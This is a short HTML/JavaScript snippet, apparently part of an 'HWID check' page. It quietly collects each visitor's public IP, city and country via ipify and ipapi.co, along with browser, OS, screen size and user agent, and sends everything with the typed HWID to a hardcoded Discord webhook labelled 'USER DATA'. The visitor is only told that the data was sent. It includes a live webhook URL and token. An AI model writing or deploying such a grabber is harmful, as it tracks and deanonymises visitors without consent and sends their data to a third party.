<script>
async function getIP() {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    return data.ip;
  } catch {
    return "unknown";
  }
}

async function getGeo(ip) {
  try {
    const res = await fetch(`https://ipapi.co/${ip}/json/`);
    return await res.json();
  } catch {
    return {};
  }
}

async function sendToDiscord(data) {
  const webhook = "https://discord.com/api/webhooks/1499459321510101186/k9uFDPnvpJ5peuvFJ6sWXbtyweO2NvbOfCGzdEaBbnGToEmlILLOp_7fzFW6FHdS-Eqv";

  await fetch(webhook, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      embeds: [{
        title: "🧠 USER DATA",
        color: 0x00ffcc,
        fields: [
          { name: "HWID (input)", value: data.hwid || "none" },
          { name: "IP", value: data.ip },
          { name: "Country", value: data.country },
          { name: "City", value: data.city },
          { name: "Browser", value: data.browser },
          { name: "OS", value: data.os },
          { name: "Screen", value: data.screen },
          { name: "UserAgent", value: data.ua }
        ],
        timestamp: new Date()
      }]
    })
  });
}

async function check() {
  const hwid = document.getElementById("hwid").value.trim();

  const ip = await getIP();
  const geo = await getGeo(ip);

  const data = {
    hwid: hwid,
    ip: ip,
    country: geo.country_name || "unknown",
    city: geo.city || "unknown",
    browser: navigator.userAgent,
    os: navigator.platform,
    screen: screen.width + "x" + screen.height,
    ua: navigator.userAgent
  };

  document.getElementById("result").innerText = "ส่งข้อมูลแล้ว ✅";

  await sendToDiscord(data);
}
</script>
